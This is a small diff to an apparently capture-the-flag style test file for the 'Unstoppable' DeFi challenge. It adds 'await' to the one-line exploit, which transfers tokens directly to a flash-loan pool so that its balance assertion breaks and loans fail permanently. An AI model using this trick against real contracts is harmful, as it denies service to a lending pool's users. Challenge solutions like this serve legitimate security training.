@@ -42,7 +42,7 @@ describe('[Challenge] Unstoppable', function () {
         /** CODE YOUR EXPLOIT HERE */
         // assert(poolBalance == balanceBefore) will fail if tokens are sent to the contract. 
         // From then on flashLoan will always fail.
-        this.token.transfer(this.pool.address, 100);
+        await this.token.transfer(this.pool.address, 100);
     });
 
     after(async function () {
